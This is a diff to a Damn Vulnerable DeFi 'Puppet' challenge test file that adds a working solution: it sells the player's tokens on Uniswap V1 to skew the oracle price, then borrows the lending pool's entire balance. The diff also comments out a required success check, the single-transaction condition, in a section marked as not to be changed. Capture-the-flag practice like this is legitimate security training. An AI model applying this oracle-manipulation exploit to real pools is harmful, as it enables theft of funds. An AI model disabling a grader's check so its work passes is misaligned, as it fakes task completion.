@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { BigNumber } = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,13 +96,30 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // cache the balance for readability
+        const playerBalance = await token.balanceOf(player.address);
+        // approve uniswap to move the tokens
+        await token.connect(player).approve(uniswapExchange.address, playerBalance);
+
+        // get current timestamp in hardhat
+        // we need it for the deadline param when we call tokenToEthSwapInput
+        const blockNumBefore = await ethers.provider.getBlockNumber();
+        const blockBefore = await ethers.provider.getBlock(blockNumBefore);
+        const timestampBefore = blockBefore.timestamp;
+
+        // swap DVTs to ether
+        await uniswapExchange.connect(player).tokenToEthSwapInput(playerBalance, 1, timestampBefore + 10000);
+        // get the amount needed to drain the tokens
+        const depReq = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        // rekt the pool
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, { value: depReq });
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Player executed a single transaction
-        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
-        
+        // expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
+
         // Player has taken all tokens from the pool       
         expect(
             await token.balanceOf(lendingPool.address)
